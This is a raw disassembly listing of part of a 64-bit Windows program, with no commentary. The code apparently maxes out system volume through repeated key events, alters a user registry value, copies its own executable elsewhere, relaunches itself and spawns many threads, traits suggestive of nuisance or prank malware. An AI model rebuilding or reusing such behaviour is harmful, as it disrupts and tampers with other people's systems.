   140003c10:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140003c14:	e8 b7 21 00 00       	call   0x140005dd0
   140003c19:	90                   	nop
   140003c1a:	48 8b 95 a8 00 00 00 	mov    0xa8(%rbp),%rdx
   140003c21:	48 83 fa 07          	cmp    $0x7,%rdx
   140003c25:	76 4b                	jbe    0x140003c72
   140003c27:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003c2e:	00 
   140003c2f:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   140003c36:	48 8b c1             	mov    %rcx,%rax
   140003c39:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003c40:	72 2b                	jb     0x140003c6d
   140003c42:	48 83 c2 27          	add    $0x27,%rdx
   140003c46:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003c4a:	48 2b c1             	sub    %rcx,%rax
   140003c4d:	48 83 e8 08          	sub    $0x8,%rax
   140003c51:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003c55:	76 16                	jbe    0x140003c6d
   140003c57:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003c5c:	45 33 c9             	xor    %r9d,%r9d
   140003c5f:	45 33 c0             	xor    %r8d,%r8d
   140003c62:	33 d2                	xor    %edx,%edx
   140003c64:	33 c9                	xor    %ecx,%ecx
   140003c66:	ff 15 54 48 00 00    	call   *0x4854(%rip)        # 0x1400084c0
   140003c6c:	cc                   	int3
   140003c6d:	e8 2e 2d 00 00       	call   0x1400069a0
   140003c72:	48 8b 8d b0 01 00 00 	mov    0x1b0(%rbp),%rcx
   140003c79:	48 33 cc             	xor    %rsp,%rcx
   140003c7c:	e8 ff 2c 00 00       	call   0x140006980
   140003c81:	4c 8d 9c 24 c0 02 00 	lea    0x2c0(%rsp),%r11
   140003c88:	00 
   140003c89:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140003c8d:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140003c91:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140003c95:	49 8b e3             	mov    %r11,%rsp
   140003c98:	5d                   	pop    %rbp
   140003c99:	c3                   	ret
   140003c9a:	cc                   	int3
   140003c9b:	cc                   	int3
   140003c9c:	cc                   	int3
   140003c9d:	cc                   	int3
   140003c9e:	cc                   	int3
   140003c9f:	cc                   	int3
   140003ca0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003ca5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003caa:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003caf:	55                   	push   %rbp
   140003cb0:	41 56                	push   %r14
   140003cb2:	41 57                	push   %r15
   140003cb4:	48 8d ac 24 20 f6 ff 	lea    -0x9e0(%rsp),%rbp
   140003cbb:	ff 
   140003cbc:	48 81 ec e0 0a 00 00 	sub    $0xae0,%rsp
   140003cc3:	48 8b 05 76 93 00 00 	mov    0x9376(%rip),%rax        # 0x14000d040
   140003cca:	48 33 c4             	xor    %rsp,%rax
   140003ccd:	48 89 85 d0 09 00 00 	mov    %rax,0x9d0(%rbp)
   140003cd4:	48 8b d9             	mov    %rcx,%rbx
   140003cd7:	33 c9                	xor    %ecx,%ecx
   140003cd9:	ff 15 01 49 00 00    	call   *0x4901(%rip)        # 0x1400085e0
   140003cdf:	8b c8                	mov    %eax,%ecx
   140003ce1:	ff 15 11 49 00 00    	call   *0x4911(%rip)        # 0x1400085f8
   140003ce7:	8b 05 67 53 00 00    	mov    0x5367(%rip),%eax        # 0x140009054
   140003ced:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003cf1:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   140003cf7:	33 f6                	xor    %esi,%esi
   140003cf9:	0f b7 05 58 53 00 00 	movzwl 0x5358(%rip),%eax        # 0x140009058
   140003d00:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003d03:	66 89 85 8c 01 00 00 	mov    %ax,0x18c(%rbp)
   140003d0a:	0f 57 c9             	xorps  %xmm1,%xmm1
   140003d0d:	48 8d 05 2c e1 ff ff 	lea    -0x1ed4(%rip),%rax        # 0x140001e40
   140003d14:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
   140003d18:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140003d1c:	48 8d 85 88 01 00 00 	lea    0x188(%rbp),%rax
   140003d23:	48 89 45 20          	mov    %rax,0x20(%rbp)
   140003d27:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
   140003d2b:	66 0f 7f 45 00       	movdqa %xmm0,0x0(%rbp)
   140003d30:	66 0f 7f 4d 10       	movdqa %xmm1,0x10(%rbp)
   140003d35:	48 89 5d f8          	mov    %rbx,-0x8(%rbp)
   140003d39:	ff 15 91 46 00 00    	call   *0x4691(%rip)        # 0x1400083d0
   140003d3f:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140003d44:	4c 8d 05 15 53 00 00 	lea    0x5315(%rip),%r8        # 0x140009060
   140003d4b:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140003d50:	48 8d 95 88 01 00 00 	lea    0x188(%rbp),%rdx
   140003d57:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140003d5c:	45 33 c9             	xor    %r9d,%r9d
   140003d5f:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140003d64:	33 c9                	xor    %ecx,%ecx
   140003d66:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140003d6d:	80 
   140003d6e:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140003d75:	80 
   140003d76:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140003d7d:	80 
   140003d7e:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140003d85:	80 
   140003d86:	ff 15 cc 45 00 00    	call   *0x45cc(%rip)        # 0x140008358
   140003d8c:	41 b9 1b 00 00 00    	mov    $0x1b,%r9d
   140003d92:	45 33 c0             	xor    %r8d,%r8d
   140003d95:	48 8b c8             	mov    %rax,%rcx
   140003d98:	ba 01 00 00 00       	mov    $0x1,%edx
   140003d9d:	48 8b f8             	mov    %rax,%rdi
   140003da0:	ff 15 22 46 00 00    	call   *0x4622(%rip)        # 0x1400083c8
   140003da6:	bb 32 00 00 00       	mov    $0x32,%ebx
   140003dab:	49 bf 7f 0f 05 fd ff 	movabs $0x7ffffffffd050f7f,%r15
   140003db2:	ff ff 7f 
   140003db5:	49 be ff ff ff ff ff 	movabs $0x7fffffffffffffff,%r14
   140003dbc:	ff ff 7f 
   140003dbf:	90                   	nop
   140003dc0:	45 33 c9             	xor    %r9d,%r9d
   140003dc3:	45 33 c0             	xor    %r8d,%r8d
   140003dc6:	33 d2                	xor    %edx,%edx
   140003dc8:	b1 af                	mov    $0xaf,%cl
   140003dca:	ff 15 80 45 00 00    	call   *0x4580(%rip)        # 0x140008350
   140003dd0:	45 33 c9             	xor    %r9d,%r9d
   140003dd3:	33 d2                	xor    %edx,%edx
   140003dd5:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140003ddb:	b1 af                	mov    $0xaf,%cl
   140003ddd:	ff 15 6d 45 00 00    	call   *0x456d(%rip)        # 0x140008350
   140003de3:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003de8:	e8 33 d2 ff ff       	call   0x140001020
   140003ded:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140003df2:	49 3b c7             	cmp    %r15,%rax
   140003df5:	7d 0c                	jge    0x140003e03
   140003df7:	48 05 80 f0 fa 02    	add    $0x2faf080,%rax
   140003dfd:	48 89 45 30          	mov    %rax,0x30(%rbp)
   140003e01:	eb 04                	jmp    0x140003e07
   140003e03:	4c 89 75 30          	mov    %r14,0x30(%rbp)
   140003e07:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   140003e0b:	e8 40 1d 00 00       	call   0x140005b50
   140003e10:	48 83 eb 01          	sub    $0x1,%rbx
   140003e14:	75 aa                	jne    0x140003dc0
   140003e16:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140003e1b:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140003e20:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003e25:	48 8d 15 e4 4e 00 00 	lea    0x4ee4(%rip),%rdx        # 0x140008d10
   140003e2c:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140003e31:	45 33 c9             	xor    %r9d,%r9d
   140003e34:	c7 44 24 28 02 00 00 	movl   $0x2,0x28(%rsp)
   140003e3b:	00 
   140003e3c:	45 33 c0             	xor    %r8d,%r8d
   140003e3f:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   140003e46:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003e4a:	c7 45 30 01 00 00 00 	movl   $0x1,0x30(%rbp)
   140003e51:	ff 15 d9 41 00 00    	call   *0x41d9(%rip)        # 0x140008030
   140003e57:	85 c0                	test   %eax,%eax
   140003e59:	75 66                	jne    0x140003ec1
   140003e5b:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003e60:	48 8d 45 30          	lea    0x30(%rbp),%rax
   140003e64:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003e6b:	00 
   140003e6c:	48 8d 15 15 4f 00 00 	lea    0x4f15(%rip),%rdx        # 0x140008d88
   140003e73:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140003e79:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003e7e:	45 33 c0             	xor    %r8d,%r8d
   140003e81:	ff 15 91 41 00 00    	call   *0x4191(%rip)        # 0x140008018
   140003e87:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003e8c:	ff 15 ae 41 00 00    	call   *0x41ae(%rip)        # 0x140008040
   140003e92:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140003e97:	4c 8d 0d 0a 4f 00 00 	lea    0x4f0a(%rip),%r9        # 0x140008da8
   140003e9e:	c7 44 24 28 64 00 00 	movl   $0x64,0x28(%rsp)
   140003ea5:	00 
   140003ea6:	45 33 c0             	xor    %r8d,%r8d
   140003ea9:	ba 1a 00 00 00       	mov    $0x1a,%edx
   140003eae:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140003eb5:	00 
   140003eb6:	b9 ff ff 00 00       	mov    $0xffff,%ecx
   140003ebb:	ff 15 cf 44 00 00    	call   *0x44cf(%rip)        # 0x140008390
   140003ec1:	ba 04 01 00 00       	mov    $0x104,%edx
   140003ec6:	48 8d 8d b0 05 00 00 	lea    0x5b0(%rbp),%rcx
   140003ecd:	ff 15 5d 42 00 00    	call   *0x425d(%rip)        # 0x140008130
   140003ed3:	85 c0                	test   %eax,%eax
   140003ed5:	0f 84 0e 01 00 00    	je     0x140003fe9
   140003edb:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140003ee1:	48 8d 95 90 01 00 00 	lea    0x190(%rbp),%rdx
   140003ee8:	33 c9                	xor    %ecx,%ecx
   140003eea:	ff 15 60 42 00 00    	call   *0x4260(%rip)        # 0x140008150
   140003ef0:	85 c0                	test   %eax,%eax
   140003ef2:	0f 84 f1 00 00 00    	je     0x140003fe9
   140003ef8:	48 8d 95 90 01 00 00 	lea    0x190(%rbp),%rdx
   140003eff:	48 8d 8d a0 03 00 00 	lea    0x3a0(%rbp),%rcx
   140003f06:	ff 15 64 41 00 00    	call   *0x4164(%rip)        # 0x140008070
   140003f0c:	48 8d 8d a0 03 00 00 	lea    0x3a0(%rbp),%rcx
   140003f13:	ff 15 bf 43 00 00    	call   *0x43bf(%rip)        # 0x1400082d8
   140003f19:	48 8d 95 b0 05 00 00 	lea    0x5b0(%rbp),%rdx
   140003f20:	48 8d 8d a0 03 00 00 	lea    0x3a0(%rbp),%rcx
   140003f27:	ff 15 a3 46 00 00    	call   *0x46a3(%rip)        # 0x1400085d0
   140003f2d:	85 c0                	test   %eax,%eax
   140003f2f:	0f 84 b4 00 00 00    	je     0x140003fe9
   140003f35:	48 8d 8d 90 01 00 00 	lea    0x190(%rbp),%rcx
   140003f3c:	ff 15 a6 43 00 00    	call   *0x43a6(%rip)        # 0x1400082e8
   140003f42:	4c 8b c0             	mov    %rax,%r8
   140003f45:	48 8d 95 b0 05 00 00 	lea    0x5b0(%rbp),%rdx
   140003f4c:	48 8d 8d c0 07 00 00 	lea    0x7c0(%rbp),%rcx
   140003f53:	ff 15 87 43 00 00    	call   *0x4387(%rip)        # 0x1400082e0
   140003f59:	45 33 c0             	xor    %r8d,%r8d
   140003f5c:	48 8d 95 c0 07 00 00 	lea    0x7c0(%rbp),%rdx
   140003f63:	48 8d 8d 90 01 00 00 	lea    0x190(%rbp),%rcx
   140003f6a:	ff 15 f8 40 00 00    	call   *0x40f8(%rip)        # 0x140008068
   140003f70:	85 c0                	test   %eax,%eax
   140003f72:	75 0b                	jne    0x140003f7f
   140003f74:	ff 15 a6 41 00 00    	call   *0x41a6(%rip)        # 0x140008120
   140003f7a:	83 f8 20             	cmp    $0x20,%eax
   140003f7d:	75 6a                	jne    0x140003fe9
   140003f7f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003f82:	c7 44 24 70 70 00 00 	movl   $0x70,0x70(%rsp)
   140003f89:	00 
   140003f8a:	33 c0                	xor    %eax,%eax
   140003f8c:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140003f91:	48 89 45 d4          	mov    %rax,-0x2c(%rbp)
   140003f95:	89 45 dc             	mov    %eax,-0x24(%rbp)
   140003f98:	48 8d 05 a1 48 00 00 	lea    0x48a1(%rip),%rax        # 0x140008840
   140003f9f:	0f 11 44 24 74       	movups %xmm0,0x74(%rsp)
   140003fa4:	c7 44 24 74 40 00 00 	movl   $0x40,0x74(%rsp)
   140003fab:	00 
   140003fac:	0f 11 45 84          	movups %xmm0,-0x7c(%rbp)
   140003fb0:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   140003fb4:	48 8d 85 c0 07 00 00 	lea    0x7c0(%rbp),%rax
   140003fbb:	0f 11 45 94          	movups %xmm0,-0x6c(%rbp)
   140003fbf:	48 89 45 88          	mov    %rax,-0x78(%rbp)
   140003fc3:	0f 11 45 a4          	movups %xmm0,-0x5c(%rbp)
   140003fc7:	c7 45 a0 01 00 00 00 	movl   $0x1,-0x60(%rbp)
   140003fce:	0f 11 45 b4          	movups %xmm0,-0x4c(%rbp)
   140003fd2:	0f 11 45 c4          	movups %xmm0,-0x3c(%rbp)
   140003fd6:	ff 15 e4 42 00 00    	call   *0x42e4(%rip)        # 0x1400082c0
   140003fdc:	85 c0                	test   %eax,%eax
   140003fde:	74 09                	je     0x140003fe9
   140003fe0:	33 c9                	xor    %ecx,%ecx
   140003fe2:	ff 15 78 40 00 00    	call   *0x4078(%rip)        # 0x140008060
   140003fe8:	cc                   	int3
   140003fe9:	e8 e2 e3 ff ff       	call   0x1400023d0
   140003fee:	e8 bd f8 ff ff       	call   0x1400038b0
   140003ff3:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003ff8:	e8 ab 29 00 00       	call   0x1400069a8
   140003ffd:	48 8d 0d 0c d4 ff ff 	lea    -0x2bf4(%rip),%rcx        # 0x140001410
   140004004:	4c 8b c8             	mov    %rax,%r9
   140004007:	4c 8d 05 12 20 00 00 	lea    0x2012(%rip),%r8        # 0x140006020
   14000400e:	33 d2                	xor    %edx,%edx
   140004010:	48 89 08             	mov    %rcx,(%rax)
   140004013:	48 8d 8d 50 01 00 00 	lea    0x150(%rbp),%rcx
   14000401a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000401f:	33 c9                	xor    %ecx,%ecx
   140004021:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004025:	ff 15 e5 44 00 00    	call   *0x44e5(%rip)        # 0x140008510
   14000402b:	48 89 85 48 01 00 00 	mov    %rax,0x148(%rbp)
   140004032:	48 85 c0             	test   %rax,%rax
   140004035:	0f 84 2a 07 00 00    	je     0x140004765
   14000403b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004040:	e8 63 29 00 00       	call   0x1400069a8
   140004045:	48 8d 0d c4 d4 ff ff 	lea    -0x2b3c(%rip),%rcx        # 0x140001510
   14000404c:	4c 8b c8             	mov    %rax,%r9
   14000404f:	4c 8d 05 ca 1f 00 00 	lea    0x1fca(%rip),%r8        # 0x140006020
   140004056:	33 d2                	xor    %edx,%edx
   140004058:	48 89 08             	mov    %rcx,(%rax)
   14000405b:	48 8d 8d 40 01 00 00 	lea    0x140(%rbp),%rcx
   140004062:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004067:	33 c9                	xor    %ecx,%ecx
   140004069:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000406d:	ff 15 9d 44 00 00    	call   *0x449d(%rip)        # 0x140008510
   140004073:	48 89 85 38 01 00 00 	mov    %rax,0x138(%rbp)
   14000407a:	48 85 c0             	test   %rax,%rax
   14000407d:	0f 84 d0 06 00 00    	je     0x140004753
   140004083:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004088:	e8 1b 29 00 00       	call   0x1400069a8
   14000408d:	48 8d 0d 3c d5 ff ff 	lea    -0x2ac4(%rip),%rcx        # 0x1400015d0
   140004094:	4c 8b c8             	mov    %rax,%r9
   140004097:	4c 8d 05 82 1f 00 00 	lea    0x1f82(%rip),%r8        # 0x140006020
   14000409e:	33 d2                	xor    %edx,%edx
   1400040a0:	48 89 08             	mov    %rcx,(%rax)
   1400040a3:	48 8d 8d 30 01 00 00 	lea    0x130(%rbp),%rcx
   1400040aa:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400040af:	33 c9                	xor    %ecx,%ecx
   1400040b1:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400040b5:	ff 15 55 44 00 00    	call   *0x4455(%rip)        # 0x140008510
   1400040bb:	48 89 85 28 01 00 00 	mov    %rax,0x128(%rbp)
   1400040c2:	48 85 c0             	test   %rax,%rax
   1400040c5:	0f 84 76 06 00 00    	je     0x140004741
   1400040cb:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400040d0:	e8 d3 28 00 00       	call   0x1400069a8
   1400040d5:	48 8d 0d a4 d5 ff ff 	lea    -0x2a5c(%rip),%rcx        # 0x140001680
   1400040dc:	4c 8b c8             	mov    %rax,%r9
   1400040df:	4c 8d 05 3a 1f 00 00 	lea    0x1f3a(%rip),%r8        # 0x140006020
   1400040e6:	33 d2                	xor    %edx,%edx
   1400040e8:	48 89 08             	mov    %rcx,(%rax)
   1400040eb:	48 8d 8d 20 01 00 00 	lea    0x120(%rbp),%rcx
   1400040f2:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400040f7:	33 c9                	xor    %ecx,%ecx
   1400040f9:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400040fd:	ff 15 0d 44 00 00    	call   *0x440d(%rip)        # 0x140008510
   140004103:	48 89 85 18 01 00 00 	mov    %rax,0x118(%rbp)
   14000410a:	48 85 c0             	test   %rax,%rax
   14000410d:	0f 84 1c 06 00 00    	je     0x14000472f
   140004113:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004118:	e8 8b 28 00 00       	call   0x1400069a8
   14000411d:	48 8d 0d ec d5 ff ff 	lea    -0x2a14(%rip),%rcx        # 0x140001710
   140004124:	4c 8b c8             	mov    %rax,%r9
   140004127:	4c 8d 05 f2 1e 00 00 	lea    0x1ef2(%rip),%r8        # 0x140006020
   14000412e:	33 d2                	xor    %edx,%edx
   140004130:	48 89 08             	mov    %rcx,(%rax)
   140004133:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   14000413a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000413f:	33 c9                	xor    %ecx,%ecx
   140004141:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004145:	ff 15 c5 43 00 00    	call   *0x43c5(%rip)        # 0x140008510
   14000414b:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   140004152:	48 85 c0             	test   %rax,%rax
   140004155:	0f 84 c2 05 00 00    	je     0x14000471d
   14000415b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004160:	e8 43 28 00 00       	call   0x1400069a8
   140004165:	48 8d 0d a4 d6 ff ff 	lea    -0x295c(%rip),%rcx        # 0x140001810
   14000416c:	4c 8b c8             	mov    %rax,%r9
   14000416f:	4c 8d 05 aa 1e 00 00 	lea    0x1eaa(%rip),%r8        # 0x140006020
   140004176:	33 d2                	xor    %edx,%edx
   140004178:	48 89 08             	mov    %rcx,(%rax)
   14000417b:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   140004182:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004187:	33 c9                	xor    %ecx,%ecx
   140004189:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000418d:	ff 15 7d 43 00 00    	call   *0x437d(%rip)        # 0x140008510
   140004193:	48 89 85 f8 00 00 00 	mov    %rax,0xf8(%rbp)
   14000419a:	48 85 c0             	test   %rax,%rax
   14000419d:	0f 84 68 05 00 00    	je     0x14000470b
   1400041a3:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400041a8:	e8 fb 27 00 00       	call   0x1400069a8
   1400041ad:	48 8d 0d 2c d7 ff ff 	lea    -0x28d4(%rip),%rcx        # 0x1400018e0
   1400041b4:	4c 8b c8             	mov    %rax,%r9
   1400041b7:	4c 8d 05 62 1e 00 00 	lea    0x1e62(%rip),%r8        # 0x140006020
   1400041be:	33 d2                	xor    %edx,%edx
   1400041c0:	48 89 08             	mov    %rcx,(%rax)
   1400041c3:	48 8d 8d f0 00 00 00 	lea    0xf0(%rbp),%rcx
   1400041ca:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400041cf:	33 c9                	xor    %ecx,%ecx
   1400041d1:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400041d5:	ff 15 35 43 00 00    	call   *0x4335(%rip)        # 0x140008510
   1400041db:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   1400041e2:	48 85 c0             	test   %rax,%rax
   1400041e5:	0f 84 0e 05 00 00    	je     0x1400046f9
   1400041eb:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400041f0:	e8 b3 27 00 00       	call   0x1400069a8
   1400041f5:	48 8d 0d b4 d7 ff ff 	lea    -0x284c(%rip),%rcx        # 0x1400019b0
   1400041fc:	4c 8b c8             	mov    %rax,%r9
   1400041ff:	4c 8d 05 1a 1e 00 00 	lea    0x1e1a(%rip),%r8        # 0x140006020
   140004206:	33 d2                	xor    %edx,%edx
   140004208:	48 89 08             	mov    %rcx,(%rax)
   14000420b:	48 8d 8d e0 00 00 00 	lea    0xe0(%rbp),%rcx
   140004212:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004217:	33 c9                	xor    %ecx,%ecx
   140004219:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000421d:	ff 15 ed 42 00 00    	call   *0x42ed(%rip)        # 0x140008510
   140004223:	48 89 85 d8 00 00 00 	mov    %rax,0xd8(%rbp)
   14000422a:	48 85 c0             	test   %rax,%rax
   14000422d:	0f 84 b4 04 00 00    	je     0x1400046e7
   140004233:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004238:	e8 6b 27 00 00       	call   0x1400069a8
   14000423d:	48 8d 0d 0c d8 ff ff 	lea    -0x27f4(%rip),%rcx        # 0x140001a50
   140004244:	4c 8b c8             	mov    %rax,%r9
   140004247:	4c 8d 05 d2 1d 00 00 	lea    0x1dd2(%rip),%r8        # 0x140006020
   14000424e:	33 d2                	xor    %edx,%edx
   140004250:	48 89 08             	mov    %rcx,(%rax)
   140004253:	48 8d 8d d0 00 00 00 	lea    0xd0(%rbp),%rcx
   14000425a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000425f:	33 c9                	xor    %ecx,%ecx
   140004261:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004265:	ff 15 a5 42 00 00    	call   *0x42a5(%rip)        # 0x140008510
   14000426b:	48 89 85 c8 00 00 00 	mov    %rax,0xc8(%rbp)
   140004272:	48 85 c0             	test   %rax,%rax
   140004275:	0f 84 5a 04 00 00    	je     0x1400046d5
   14000427b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004280:	e8 23 27 00 00       	call   0x1400069a8
   140004285:	48 8d 0d c4 d9 ff ff 	lea    -0x263c(%rip),%rcx        # 0x140001c50
   14000428c:	4c 8b c8             	mov    %rax,%r9
   14000428f:	4c 8d 05 8a 1d 00 00 	lea    0x1d8a(%rip),%r8        # 0x140006020
   140004296:	33 d2                	xor    %edx,%edx
   140004298:	48 89 08             	mov    %rcx,(%rax)
   14000429b:	48 8d 8d c0 00 00 00 	lea    0xc0(%rbp),%rcx
   1400042a2:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400042a7:	33 c9                	xor    %ecx,%ecx
   1400042a9:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400042ad:	ff 15 5d 42 00 00    	call   *0x425d(%rip)        # 0x140008510
   1400042b3:	48 89 85 b8 00 00 00 	mov    %rax,0xb8(%rbp)
   1400042ba:	48 85 c0             	test   %rax,%rax
   1400042bd:	0f 84 00 04 00 00    	je     0x1400046c3
   1400042c3:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400042c8:	e8 db 26 00 00       	call   0x1400069a8
   1400042cd:	48 8d 0d 7c da ff ff 	lea    -0x2584(%rip),%rcx        # 0x140001d50
   1400042d4:	4c 8b c8             	mov    %rax,%r9
   1400042d7:	4c 8d 05 42 1d 00 00 	lea    0x1d42(%rip),%r8        # 0x140006020
   1400042de:	33 d2                	xor    %edx,%edx
   1400042e0:	48 89 08             	mov    %rcx,(%rax)
   1400042e3:	48 8d 8d b0 00 00 00 	lea    0xb0(%rbp),%rcx
   1400042ea:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400042ef:	33 c9                	xor    %ecx,%ecx
   1400042f1:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400042f5:	ff 15 15 42 00 00    	call   *0x4215(%rip)        # 0x140008510
   1400042fb:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   140004302:	48 85 c0             	test   %rax,%rax
   140004305:	0f 84 a6 03 00 00    	je     0x1400046b1
   14000430b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004310:	e8 93 26 00 00       	call   0x1400069a8
   140004315:	48 8d 0d 64 db ff ff 	lea    -0x249c(%rip),%rcx        # 0x140001e80
   14000431c:	4c 8b c8             	mov    %rax,%r9
   14000431f:	4c 8d 05 fa 1c 00 00 	lea    0x1cfa(%rip),%r8        # 0x140006020
   140004326:	33 d2                	xor    %edx,%edx
   140004328:	48 89 08             	mov    %rcx,(%rax)
   14000432b:	48 8d 8d a0 00 00 00 	lea    0xa0(%rbp),%rcx
   140004332:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004337:	33 c9                	xor    %ecx,%ecx
   140004339:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000433d:	ff 15 cd 41 00 00    	call   *0x41cd(%rip)        # 0x140008510
   140004343:	48 89 85 98 00 00 00 	mov    %rax,0x98(%rbp)
   14000434a:	48 85 c0             	test   %rax,%rax
   14000434d:	0f 84 4c 03 00 00    	je     0x14000469f
   140004353:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004358:	e8 4b 26 00 00       	call   0x1400069a8
   14000435d:	48 8d 0d 0c dc ff ff 	lea    -0x23f4(%rip),%rcx        # 0x140001f70
   140004364:	4c 8b c8             	mov    %rax,%r9
   140004367:	4c 8d 05 b2 1c 00 00 	lea    0x1cb2(%rip),%r8        # 0x140006020
   14000436e:	33 d2                	xor    %edx,%edx
   140004370:	48 89 08             	mov    %rcx,(%rax)
   140004373:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   14000437a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000437f:	33 c9                	xor    %ecx,%ecx
   140004381:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004385:	ff 15 85 41 00 00    	call   *0x4185(%rip)        # 0x140008510
   14000438b:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   140004392:	48 85 c0             	test   %rax,%rax
   140004395:	0f 84 f2 02 00 00    	je     0x14000468d
   14000439b:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400043a0:	e8 03 26 00 00       	call   0x1400069a8
   1400043a5:	48 8d 0d 14 dd ff ff 	lea    -0x22ec(%rip),%rcx        # 0x1400020c0
   1400043ac:	4c 8b c8             	mov    %rax,%r9
   1400043af:	4c 8d 05 6a 1c 00 00 	lea    0x1c6a(%rip),%r8        # 0x140006020
   1400043b6:	33 d2                	xor    %edx,%edx
   1400043b8:	48 89 08             	mov    %rcx,(%rax)
   1400043bb:	48 8d 8d 80 00 00 00 	lea    0x80(%rbp),%rcx
   1400043c2:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400043c7:	33 c9                	xor    %ecx,%ecx
   1400043c9:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400043cd:	ff 15 3d 41 00 00    	call   *0x413d(%rip)        # 0x140008510
   1400043d3:	48 89 45 78          	mov    %rax,0x78(%rbp)
   1400043d7:	48 85 c0             	test   %rax,%rax
   1400043da:	0f 84 9b 02 00 00    	je     0x14000467b
   1400043e0:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400043e5:	e8 be 25 00 00       	call   0x1400069a8
